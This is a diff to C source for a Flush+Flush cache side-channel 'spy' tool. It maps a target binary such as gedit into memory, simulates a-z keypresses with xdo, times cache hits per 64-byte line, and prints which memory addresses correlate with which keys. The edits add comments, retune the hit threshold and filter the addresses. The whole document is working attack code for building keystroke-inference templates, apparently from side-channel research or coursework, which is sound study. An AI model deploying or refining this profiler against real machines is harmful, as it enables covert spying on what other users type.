@@ -11,14 +11,16 @@
 #include <stdint.h>
 #include "../../cacheutils.h"
 
-// this number varies on different systems
-#define MIN_HIT_CYCLES (92)
+// Adjust this number for your machine. it is the threshold between hit and miss.
+#define MIN_HIT_CYCLES (105)
 
+// Init xdo - a library that simulates keypresses
 xdo_t* xdo;
 size_t nkeys = 0;
 char key[2] = {'0', 0};
 Window win;
 
+// Execute Flush&Flush and count number of cache hits during the profiling stage.
 size_t flushandflush(void* addr, size_t duration)
 {
   size_t count = 0;
@@ -40,6 +42,8 @@ size_t flushandflush(void* addr, size_t duration)
   return count;
 }
 
+// Execute keypresses for a-z keys. for each stage, simulate the keypress of the key presented in key field. for each iteration, 
+// create a keypress and delete previous text on gedit (Ctrl+a and Delete)
 void keythread()
 {
   int count = 0;
@@ -64,49 +68,66 @@ void keythread()
   }
 }
 
+// Notice that xdo simulates keypresses on the current open window. so its importent to change to gedit before the xdo
+// thread start (By executing sleep before running spy).
 int main(int argc, char** argv)
 {
 
-  // INITIALIZATION
-
+  // Init xdo threads
   XInitThreads();
   pthread_t t;
+
+  // Init key object with keyid and the char that represents the key
   key[1] = 0;
   key[0] = 'a';
+
   xdo = xdo_new(NULL);
   xdo_get_active_window(xdo,&win);
   if (argc != 8)
     exit(!fprintf(stderr,"  usage: ./spy <probeduration> <addressrange> <perms> <offset> <dev> <inode> <filename>\n"
                  "example: ./spy 200             400000-489000  --    0        -- -- /usr/bin/gedit\n"));
   size_t duration = 0;
+
   if (!sscanf(argv[1],"%lu",&duration))
     exit(!printf("duration error\n"));
+  
+  // Input validity checks
   unsigned char* start = 0;
   unsigned char* end = 0;
   if (!sscanf(argv[2],"%p-%p",&start,&end))
     exit(!printf("address range error\n"));
+  
   size_t range = end - start;
   size_t offset = 0;
+
   if (!sscanf(argv[4],"%lx",&offset))
     exit(!printf("offset error\n"));
+  
   char filename[4096];
   if (!sscanf(argv[7],"%s",filename))
     exit(!fprintf(stderr,"filename error\n"));
+
+  // Starting profiling...
   fprintf(stderr,"filename: %80s, offset: %8lx, duration: %luus, probes: %10lu\n",filename,offset,duration,range/64);
   if (duration == 0)
     exit(0);
   pthread_create(&t,0,(void*(*)(void*))keythread,0);
+
+  // Open attaked process
   int fd = open(filename,O_RDONLY);
+
+  // Map process to the program's virtual memory
   start = ((unsigned char*)mmap(0, range, PROT_READ, MAP_SHARED, fd, offset & ~0xFFFUL)) + (offset & 0xFFFUL);
   char j = 0;
+
+  // Range of letters we want to profile
   char* chars = "abcdefghijklmnopqrstuvwxyz";
   size_t chars_len = strlen(chars);
   float* result = malloc(sizeof(float) * chars_len * range/64);
   size_t count = 0;
   size_t promille = 0;
   
-  // PROFILING
-  
+  // Profiling loop, mesure time while simulating keypresses  
  	for (size_t i = 0; i < range; i += 64)
   {
     for (j = 0; j < chars_len; ++j)
@@ -128,27 +149,50 @@ int main(int argc, char** argv)
     }
   }
   
-  // SIMPLE POST PROCESSING
-  fprintf(stderr,"Events per address:\n");
-  size_t found = 0;
-  for (size_t i = 0; i < range/64; ++i)
-  {
-    printf("%8p,",(void*)(offset + i * 64));
-    fprintf(stderr,"%8p:",(void*)(offset + i * 64));
-    float lp = 50.0;
-    for (float p = 1.0; p > 0.7; p -= 0.1)
-    {
+
+  bool should_print_Addr(size_t i){
+     int count = 0;
+     float lp = 50.0; //Starting Upper bound
+     for (float p = 1.0; p > 0.7; p -= 0.1)
+     {
+      //For Each monitored key
       for (size_t j = 0; j < chars_len; ++j)
         if (result[i * chars_len + j] >= p && result[i * chars_len + j] < lp)
         {
-          fprintf(stderr,"%c",chars[j]);
-          printf("%c",chars[j]);
+          count++;
         }
       lp = p;
     }
-    fprintf(stderr,"\n");
-    printf("\n");
+    return ((count > 0) && (count < 6));
   }
+
+  // Print Memory address and key binding. notice that we want the threshold to be more than 70% hits for key, per memory address.
+  // We don't want to monitor addresses for void, so we filter memory addresses with more than 5 keys associated with it, and with less than 1.
+  fprintf(stderr,"Events per address:\n");
+  size_t found = 0;
+  // For Each memory address
+  for (size_t i = 0; i < range/64; ++i)
+  {
+    if(should_print_Addr(i)){
+        printf("%8p,",(void*)(offset + i * 64));
+        fprintf(stderr,"%8p:",(void*)(offset + i * 64));
+        float lp = 50.0; //Starting Upper bound
+        for (float p = 1.0; p > 0.7; p -= 0.1)
+        {
+          //For Each monitored key
+          for (size_t j = 0; j < chars_len; ++j)
+            if (result[i * chars_len + j] >= p && result[i * chars_len + j] < lp)
+            {
+              fprintf(stderr,"%c",chars[j]);
+              printf("%c",chars[j]);
+            }
+          lp = p;
+        }
+        fprintf(stderr,"\n");
+        printf("\n");
+    } 
+  }
+  
   free(result);
   munmap(start,range);
   close(fd);
